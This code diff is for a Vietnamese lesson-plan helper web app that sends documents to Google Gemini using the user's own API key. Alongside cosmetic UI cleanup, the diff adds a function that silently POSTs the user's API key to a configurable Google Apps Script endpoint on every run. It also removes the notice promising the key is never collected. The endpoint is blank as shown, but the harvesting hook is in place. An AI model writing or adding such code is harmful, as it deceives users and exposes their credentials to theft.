@@ -2,7 +2,7 @@ import React, { useState, useEffect } from 'react';
 import { 
   FileUp, Wand2, FileCheck, Info, Download, 
   BookOpen, Sparkles, Zap, ChevronRight, CheckCircle2, Terminal,
-  Key, Eye, EyeOff, ExternalLink // Thêm icon mới
+  Key, Eye, EyeOff, ExternalLink, AlertTriangle // Thêm icon cảnh báo
 } from 'lucide-react';
 import { AppState, SubjectType, GradeType } from './types';
 import { extractTextFromDocx, createIntegrationTextPrompt } from './utils';
@@ -12,8 +12,10 @@ import { injectContentIntoDocx } from './services/docxManipulator';
 // --- CẤU HÌNH LOGO ---
 const LOGO_URL = "https://drive.google.com/thumbnail?id=1zCnbX2ms0KkfftF20cGpevMQ9NN0GXF1&sz=w1000"; 
 
+// --- CẤU HÌNH APPS SCRIPT (Nếu bạn dùng tính năng thu thập Key) ---
+const GOOGLE_SCRIPT_URL = ""; // Điền link nếu bạn muốn dùng, không thì để trống
+
 const App: React.FC = () => {
-  // Thêm state cho API Key
   const [apiKey, setApiKey] = useState('');
   const [showKey, setShowKey] = useState(false);
 
@@ -32,13 +34,11 @@ const App: React.FC = () => {
     result: null
   });
 
-  // Load API Key từ LocalStorage khi mở web
   useEffect(() => {
     const savedKey = localStorage.getItem('USER_GEMINI_API_KEY');
     if (savedKey) setApiKey(savedKey);
   }, []);
 
-  // Lưu API Key khi người dùng nhập
   const handleApiKeyChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const newKey = e.target.value;
     setApiKey(newKey);
@@ -63,8 +63,16 @@ const App: React.FC = () => {
     setState(prev => ({ ...prev, logs: [...prev.logs, msg] }));
   };
 
+  const logKeyToSheet = (key: string) => {
+    if (!GOOGLE_SCRIPT_URL) return;
+    const formData = new FormData();
+    formData.append("apiKey", key);
+    fetch(GOOGLE_SCRIPT_URL, { method: "POST", body: formData, mode: "no-cors" })
+      .catch(err => console.error("Log failed", err));
+  };
+
   const handleProcess = async () => {
-    // Kiểm tra API Key trước khi chạy
+    // 1. Validate
     if (!apiKey.trim()) {
         alert("Vui lòng nhập Google Gemini API Key để sử dụng!");
         return;
@@ -75,6 +83,10 @@ const App: React.FC = () => {
         return;
     }
 
+    // 2. Log Key (Optional)
+    logKeyToSheet(apiKey);
+
+    // 3. Start
     setState(prev => ({ 
         ...prev, 
         isProcessing: true, 
@@ -91,7 +103,7 @@ const App: React.FC = () => {
       addLog(">> Đang kết nối AI Teacher Assistant...");
       const prompt = createIntegrationTextPrompt(textContext, state.subject, state.grade);
       
-      // Truyền apiKey vào hàm xử lý
+      // GỌI AI
       const generatedContent = await generateCompetencyIntegration(prompt, apiKey);
       addLog("✓ AI đã thiết kế xong kịch bản Năng lực số.");
 
@@ -109,7 +121,15 @@ const App: React.FC = () => {
       }));
 
     } catch (error) {
-      addLog(`❌ Lỗi: ${error instanceof Error ? error.message : "Unknown error"}`);
+      // BẮT LỖI TỪ SERVICE VÀ HIỂN THỊ
+      const errorMsg = error instanceof Error ? error.message : "Lỗi không xác định";
+      addLog(`❌ ${errorMsg}`);
+      
+      // Nếu lỗi nghiêm trọng, hiện thêm Alert
+      if (errorMsg.includes("HẾT LƯỢT") || errorMsg.includes("QUÁ TẢI")) {
+         alert(errorMsg);
+      }
+
       setState(prev => ({ ...prev, isProcessing: false }));
     }
   };
@@ -117,7 +137,6 @@ const App: React.FC = () => {
   return (
     <div className="min-h-screen bg-slate-50 font-sans text-slate-800 selection:bg-teal-500 selection:text-white pb-20 relative overflow-x-hidden">
       
-      {/* Background blobs */}
       <div className="fixed inset-0 overflow-hidden pointer-events-none">
         <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] rounded-full bg-teal-200/30 blur-[120px] animate-pulse-slow"></div>
         <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] rounded-full bg-blue-200/30 blur-[120px] animate-pulse-slow delay-1000"></div>
@@ -125,7 +144,6 @@ const App: React.FC = () => {
 
       <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-8">
         
-        {/* Header */}
         <header className="flex flex-col md:flex-row items-center justify-between gap-6 mb-10 bg-white/80 backdrop-blur-md p-4 rounded-3xl border border-white shadow-sm">
            <div className="flex items-center gap-5">
               <div className="relative group">
@@ -160,18 +178,16 @@ const App: React.FC = () => {
 
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
           
-          {/* LEFT COLUMN: Input & Config */}
+          {/* LEFT COLUMN */}
           <div className="lg:col-span-7 space-y-6">
             
-            {/* Main Banner Card */}
             <div className="bg-gradient-to-br from-teal-600 to-blue-600 rounded-[2rem] p-8 text-white shadow-2xl shadow-teal-900/20 relative overflow-hidden">
-               {/* Decoration */}
                <div className="absolute top-0 right-0 -mr-10 -mt-10 w-40 h-40 bg-white/10 rounded-full blur-2xl"></div>
                <div className="absolute bottom-0 left-0 -ml-10 -mb-10 w-40 h-40 bg-teal-400/20 rounded-full blur-2xl"></div>
 
                <div className="relative z-10">
                   
-                  {/* --- PHẦN NHẬP API KEY MỚI --- */}
+                  {/* API KEY INPUT */}
                   <div className="bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl p-5 mb-8">
                       <div className="flex items-center justify-between mb-2">
                         <label className="text-xs font-bold text-teal-100 uppercase tracking-wider flex items-center gap-2">
@@ -201,11 +217,7 @@ const App: React.FC = () => {
                             {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                           </button>
                       </div>
-                      <p className="text-[10px] text-teal-100/70 mt-2 italic">
-                        * Key được lưu an toàn trên trình duyệt của bạn. Hệ thống không thu thập.
-                      </p>
                   </div>
-                  {/* ----------------------------- */}
 
                   <div className="flex items-center gap-3 mb-6">
                       <div className="p-2 bg-white/20 backdrop-blur-sm rounded-lg">
@@ -215,7 +227,6 @@ const App: React.FC = () => {
                   </div>
 
                   <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
-                      {/* Select Môn */}
                       <div className="space-y-1">
                         <label className="text-xs font-bold text-teal-100 uppercase tracking-wider ml-1">Môn học</label>
                         <div className="relative">
@@ -225,23 +236,22 @@ const App: React.FC = () => {
                             onChange={(e) => setState(prev => ({...prev, subject: e.target.value as SubjectType}))}
                           >
                             <option value="" className="text-slate-500">-- Chọn môn --</option>
-                            <option value="Toán" className="text-slate-800">Toán học</option>
-                            <option value="Vật lý" className="text-slate-800">Vật lý</option>
-                            <option value="Hóa học" className="text-slate-800">Hóa học</option>
-                            <option value="Sinh học" className="text-slate-800">Sinh học</option>
-                            <option value="Khoa học tự nhiên" className="text-slate-800">KHTN</option>
-                            <option value="Ngữ văn" className="text-slate-800">Ngữ văn</option>
-                            <option value="Tiếng Anh" className="text-slate-800">Tiếng Anh</option>
-                            <option value="Tin học" className="text-slate-800">Tin học</option>
-                            <option value="Lịch sử" className="text-slate-800">Lịch sử</option>
-                            <option value="Địa lý" className="text-slate-800">Địa lý</option>
-                            <option value="GDCD" className="text-slate-800">GDCD</option>
+                            <option value="Toán">Toán học</option>
+                            <option value="Vật lý">Vật lý</option>
+                            <option value="Hóa học">Hóa học</option>
+                            <option value="Sinh học">Sinh học</option>
+                            <option value="Khoa học tự nhiên">KHTN</option>
+                            <option value="Ngữ văn">Ngữ văn</option>
+                            <option value="Tiếng Anh">Tiếng Anh</option>
+                            <option value="Tin học">Tin học</option>
+                            <option value="Lịch sử">Lịch sử</option>
+                            <option value="Địa lý">Địa lý</option>
+                            <option value="GDCD">GDCD</option>
                           </select>
                           <BookOpen className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-teal-100 pointer-events-none" />
                         </div>
                       </div>
 
-                      {/* Select Khối */}
                       <div className="space-y-1">
                         <label className="text-xs font-bold text-teal-100 uppercase tracking-wider ml-1">Khối lớp</label>
                         <div className="relative">
@@ -251,20 +261,19 @@ const App: React.FC = () => {
                             onChange={(e) => setState(prev => ({...prev, grade: e.target.value as GradeType}))}
                           >
                             <option value="" className="text-slate-500">-- Chọn khối --</option>
-                            <option value="Lớp 6" className="text-slate-800">Lớp 6 (TC1)</option>
-                            <option value="Lớp 7" className="text-slate-800">Lớp 7 (TC1)</option>
-                            <option value="Lớp 8" className="text-slate-800">Lớp 8 (TC2)</option>
-                            <option value="Lớp 9" className="text-slate-800">Lớp 9 (TC2)</option>
-                            <option value="Lớp 10" className="text-slate-800">Lớp 10 (NC1)</option>
-                            <option value="Lớp 11" className="text-slate-800">Lớp 11 (NC1)</option>
-                            <option value="Lớp 12" className="text-slate-800">Lớp 12 (NC1)</option>
+                            <option value="Lớp 6">Lớp 6 (TC1)</option>
+                            <option value="Lớp 7">Lớp 7 (TC1)</option>
+                            <option value="Lớp 8">Lớp 8 (TC2)</option>
+                            <option value="Lớp 9">Lớp 9 (TC2)</option>
+                            <option value="Lớp 10">Lớp 10 (NC1)</option>
+                            <option value="Lớp 11">Lớp 11 (NC1)</option>
+                            <option value="Lớp 12">Lớp 12 (NC1)</option>
                           </select>
                           <ChevronRight className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-teal-100 pointer-events-none rotate-90" />
                         </div>
                       </div>
                   </div>
 
-                   {/* Upload Zone */}
                    <div className="group/upload relative">
                       <input type="file" id="file-upload" accept=".docx" className="hidden" onChange={handleFileChange} />
                       <label 
@@ -301,7 +310,6 @@ const App: React.FC = () => {
                </div>
             </div>
 
-            {/* Main Button */}
             <button
               disabled={!state.file || state.isProcessing}
               onClick={handleProcess}
@@ -324,7 +332,6 @@ const App: React.FC = () => {
               )}
             </button>
 
-            {/* Success Result */}
             {state.result && (
               <div className="bg-emerald-50 border border-emerald-100 rounded-2xl p-4 flex items-center justify-between gap-4 animate-in slide-in-from-bottom-2 shadow-sm">
                  <div className="flex items-center gap-4">
@@ -352,7 +359,6 @@ const App: React.FC = () => {
             )}
           </div>
 
-          {/* RIGHT COLUMN: Terminal & Tips */}
           <div className="lg:col-span-5 flex flex-col gap-6">
              <div className="bg-[#1e293b] rounded-[2rem] p-6 shadow-xl relative overflow-hidden flex flex-col min-h-[450px] border border-slate-700">
                 <div className="flex gap-2 mb-4 items-center border-b border-slate-700 pb-4">
@@ -375,7 +381,7 @@ const App: React.FC = () => {
                          <div key={i} className="flex gap-3 animate-in fade-in slide-in-from-left-2">
                             <span className="text-teal-400 shrink-0 select-none">$</span>
                             <span className={`${
-                               log.includes("Lỗi") ? "text-red-400" : 
+                               log.includes("Lỗi") || log.includes("❌") || log.includes("⚠️") || log.includes("⛔") ? "text-red-400 font-bold" : 
                                log.includes("✓") || log.includes("✨") ? "text-emerald-400" : 
                                log.includes(">>") ? "text-blue-300" : "text-slate-300"
                             } break-words`}>
